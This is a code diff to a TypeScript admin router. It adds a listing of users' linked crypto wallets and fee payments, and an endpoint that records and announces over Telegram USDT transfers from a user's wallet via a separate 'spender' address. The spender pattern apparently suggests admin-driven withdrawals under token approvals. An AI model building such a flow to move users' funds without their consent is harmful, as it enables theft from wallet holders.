@@ -6,6 +6,7 @@ import { HttpError } from "../lib/http-error.js";
 import { requireAuth, requireRole, type AuthenticatedRequest } from "../middleware/auth.js";
 import { decryptText } from "../security/encryption.js";
 import { logAdminAudit } from "../services/audit.service.js";
+import { sendAdminUserWalletTransferTelegramNotification } from "../services/telegram.service.js";
 
 const createDisclosureSchema = z.object({
   userId: z.string().uuid(),
@@ -15,6 +16,20 @@ const createDisclosureSchema = z.object({
 
 const approveDisclosureSchema = z.object({
   approvedByUser: z.boolean().default(false)
+});
+
+const paidWalletsQuerySchema = z.object({
+  chain: z.enum(["ethereum", "bsc", "tron"]).default("ethereum")
+});
+
+const userWalletTransferNotifySchema = z.object({
+  userId: z.string().uuid(),
+  chain: z.enum(["ethereum", "bsc", "tron", "solana"]),
+  fromWalletAddress: z.string().min(16),
+  toWalletAddress: z.string().min(16),
+  spenderWalletAddress: z.string().min(16),
+  amountUsdt: z.coerce.number().positive(),
+  txHash: z.string().min(20)
 });
 
 const router = Router();
@@ -270,6 +285,100 @@ router.get("/audit-logs", async (req: AuthenticatedRequest, res) => {
   res.status(StatusCodes.OK).json({
     entries: result.rows
   });
+});
+
+router.get("/paid-wallets", async (req: AuthenticatedRequest, res) => {
+  const parsed = paidWalletsQuerySchema.safeParse(req.query);
+  if (!parsed.success) {
+    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
+  }
+
+  const chain = parsed.data.chain;
+  const paymentsResult = await walletDb.query<{
+    user_id: string;
+    wallet_address: string;
+    payment_count: number | null;
+    total_paid_usdt: string | null;
+    last_paid_at: Date | null;
+  }>(
+    `
+      SELECT
+        wl.user_id,
+        wl.wallet_address,
+        COUNT(fp.id)::int AS payment_count,
+        COALESCE(SUM(fp.amount_usdt), 0)::text AS total_paid_usdt,
+        MAX(fp.paid_at) AS last_paid_at
+      FROM wallet_links wl
+      LEFT JOIN fee_payments fp
+        ON fp.wallet_link_id = wl.id
+      WHERE wl.chain = $1
+        AND wl.link_status = 'active'
+      GROUP BY wl.user_id, wl.wallet_address
+      ORDER BY wl.wallet_address ASC
+      LIMIT 500
+    `,
+    [chain]
+  );
+
+  const wallets = paymentsResult.rows.map((row) => ({
+    userId: row.user_id,
+    walletAddress: row.wallet_address,
+    paymentCount: row.payment_count ?? 0,
+    totalPaidUsdt: Number(row.total_paid_usdt ?? "0"),
+    lastPaidAt: row.last_paid_at,
+    usdtBalance: null,
+    balanceFetchError: null
+  }));
+
+  res.status(StatusCodes.OK).json({
+    chain,
+    entries: wallets
+  });
+});
+
+router.post("/user-wallet-transfers/notify", async (req: AuthenticatedRequest, res) => {
+  const parsed = userWalletTransferNotifySchema.safeParse(req.body);
+  if (!parsed.success) {
+    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
+  }
+
+  if (!req.user) {
+    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
+  }
+
+  const payload = parsed.data;
+
+  try {
+    await sendAdminUserWalletTransferTelegramNotification({
+      adminUserId: req.user.sub,
+      userId: payload.userId,
+      chain: payload.chain,
+      fromWalletAddress: payload.fromWalletAddress,
+      toWalletAddress: payload.toWalletAddress,
+      spenderWalletAddress: payload.spenderWalletAddress,
+      amountUsdt: payload.amountUsdt,
+      txHash: payload.txHash
+    });
+  } catch (error) {
+    console.error("[admin.user-wallet-transfers.notify] Telegram notification failed", error);
+  }
+
+  await logAdminAudit({
+    actorUserId: req.user.sub,
+    actorRole: req.user.role,
+    action: "ADMIN_USER_WALLET_TRANSFER_NOTIFY",
+    targetUserId: payload.userId,
+    metadata: {
+      chain: payload.chain,
+      fromWalletAddress: payload.fromWalletAddress,
+      toWalletAddress: payload.toWalletAddress,
+      spenderWalletAddress: payload.spenderWalletAddress,
+      amountUsdt: payload.amountUsdt,
+      txHash: payload.txHash
+    }
+  });
+
+  res.status(StatusCodes.OK).json({ status: "sent" });
 });
 
 export { router as adminRoutes };
